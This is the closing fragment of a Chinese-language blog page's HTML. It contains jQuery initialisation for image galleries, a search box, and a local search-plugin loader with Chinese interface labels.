                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>